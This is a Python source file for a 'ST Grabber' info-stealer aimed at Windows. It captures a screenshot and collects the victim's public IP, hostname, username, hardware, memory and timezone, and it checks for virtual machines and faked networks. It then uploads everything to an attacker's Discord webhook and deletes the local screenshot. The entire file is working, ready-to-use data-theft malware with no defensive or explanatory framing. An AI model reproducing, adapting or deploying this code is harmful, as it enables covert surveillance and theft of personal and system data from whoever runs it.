#author: suegdu

from requests import get
from discord_webhook import DiscordEmbed,DiscordWebhook
import platform
from platform import uname
import os
import sys
import time
import wmi
import psutil
import datetime
import subprocess
import pyautogui
import secrets
from pathlib import Path



DISCORD_WEBHOOK = "YOUR WEBHOOK LINK"
parent = Path(__file__).with_name("temp")
try:
    os.mkdir(parent)
    os.chdir(parent)
except FileExistsError:
    os.chdir(parent)

rs = secrets.token_hex(6)
sc = pyautogui.screenshot()
sc.save(f'{rs}file.png')
asr = f"{rs}file.png"
c = wmi.WMI()   
my_system = c.Win32_ComputerSystem()[0]
time2 = time.time()
sr = uname()
now = datetime.datetime.now()
local_now = now.astimezone()
local_tz = local_now.tzinfo
local_tzname = local_tz.tzname(local_now)

if hasattr(sys, 'real_prefix'):
    st = True
else:
     st = False

proc = platform.processor() 

fknet = False
try:
 f = subprocess.check_output("ping google.com -n 1")
except:
    fknet = True
else:
    fknet = "Unknown"


def sg():

 ip = get('https://api.ipify.org').text 
 webhook = DiscordWebhook(url=DISCORD_WEBHOOK,username="ST Grabber",content="Screenshot :")
 embed = DiscordEmbed(title="PT-H14", description="**User (Device)**", color=0xfff700) 
 embed.set_author(name="ST", icon_url="https://www.shareicon.net/data/512x512/2015/09/28/647652_watch_512x512.png") 
 embed.set_thumbnail(url="https://www.blackhatwisdom.com/wp-content/uploads/2016/10/black-hat-wisdom-logo-2.png") 
 embed.add_embed_field(name="Public IP :", value=ip, inline=True) 
 embed.add_embed_field(name="Hostname, Device :", value=f"{platform.node()}", inline=True)
 embed.add_embed_field(name="ETC :", value=f"{uname()}".replace("uname_result","").replace(")","").replace("(",""), inline=True) 
 embed.add_embed_field(name="User :",value=f" {os.getlogin()} ")
 embed.add_embed_field(name="Operating system :",value=f" {platform.system()}")
 embed.add_embed_field(name="Virtual Machine :",value=f" {st}")
 embed.add_embed_field(name="Manufacturer :",value=f" {my_system.Manufacturer}")
 embed.add_embed_field(name="Model :",value=f" {my_system. Model}")
 embed.add_embed_field(name="NumberOfProcessors :",value=f" {my_system.NumberOfProcessors}")
 embed.add_embed_field(name="SystemType :",value=f" {my_system.SystemType}")
 embed.add_embed_field(name="SystemFamily :",value=f" {my_system.SystemFamily}")
 embed.add_embed_field(name="Memory :",value=f" {psutil.virtual_memory()}")
 embed.add_embed_field(name="Path :", value=f"**{sys.argv[0]}**", inline=True)
 embed.add_embed_field(name="Local Timezone :", value=f"**{local_tzname}**", inline=True)
 embed.add_embed_field(name="Processor :", value=f"**{proc}**", inline=True)
 embed.add_embed_field(name="Fake Net :", value=f"**{fknet}**", inline=True)
 embed.set_footer(text=f"{time2}", icon_url="https://static.thenounproject.com/png/2256517-200.png")
 with open(f"{asr}", "rb") as f:
    webhook.add_file(file=f.read(), filename=f'./{asr}')
 webhook.add_embed(embed)
 response = webhook.execute()



 os.remove(f"{asr}")


if __name__ == "__main__":
 sg()




